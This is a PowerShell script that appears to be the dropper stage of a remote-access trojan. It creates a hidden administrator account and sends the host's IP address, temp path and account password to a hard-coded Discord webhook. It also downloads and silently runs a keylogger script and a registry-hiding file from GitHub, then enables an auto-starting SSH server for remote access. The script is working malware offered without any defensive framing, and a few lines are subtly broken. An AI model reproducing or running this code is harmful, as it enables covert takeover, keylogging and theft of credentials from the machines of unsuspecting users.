function random_text {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | %{[char]$_})
}
# Attempt to disable Windows Defender

#Creat User Admin
$UserName = "kAiZ3n"
$pass = random_text
if(Get-LocalUser -Name $UserName -ErrorAction SilientlyContinue){
    Remove-LocalUser -Name $UserName
}
New-LocalUser -Name $UserName -Password (ConvertTo-SecureString $pass -AsPlainText -Force) -FullName "New User" -Description "Ti kho?n m?i du?c t?o b?ng PowerShell"
Add-LocalGroupMember -Group "Administrators" -Member $UserName

#Create dir Working temp
$initial_dir = Get-Location
$dirName = random_text
$pathDir = $env:temp\$dirName
$configfile = "$env:config.kAiZ3n"
#Send infor target into email 
$email = Get-Content email.txt
$pword = Get-Content pass.txt
if(Test-Path $configfile){
    Remove-Item $configfile -Force
}
$ip = (Get-NetIpAddress -AddressFamily IPV4 -InterfaceAlias Ethernet).IPAddress

#Write config file
Add-Content -Path $configfile -Value $ip
Add-Content -Path $configfile -Value $pathDir
Add-Content -Path $configfile -Value $pass
#discord webhook
$WebhookURL = "https://discord.com/api/webhooks/1341801773546999948/2ocX7pSZBLbPlU8_FvGSY6dIsEd5MBy-muOLz5V6g-VwpX8ffe8ytFSA8J2jzJ31JWZi"
curl.exe -F "file=@$configfile" $WebhookURL
Remove-Item $configfile
#goto tem, make working directory
mkdir $pathDir
Set-Location $pathDir

# Registry to hide local admin
$reg = random_text
$vbs_script = random_text


# Hide User 
cd C:\Users
attrib +h +s +r NewUserText
Invoke-WebRequest -Uri https://raw.githubusercontent.com/bruning-frighting/MyRAT/refs/heads/main/keystroke.vbs -OutFile "$vbs_script.vbs"
Invoke-WebRequest -Uri https://raw.githubusercontent.com/bruning-frighting/MyRAT/refs/heads/main/reghidden.reg -OutFile "$reg.reg" 
Start-Process -FilePath "regedit.exe" -ArgumentList "/s `"$reg.reg`"" -NoNewWindow -Wait
Start-Process -FilePath "wscript.exe" -ArgumentList "`"$vbs_script.vbs`"" -NoNewWindow -Wait
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'
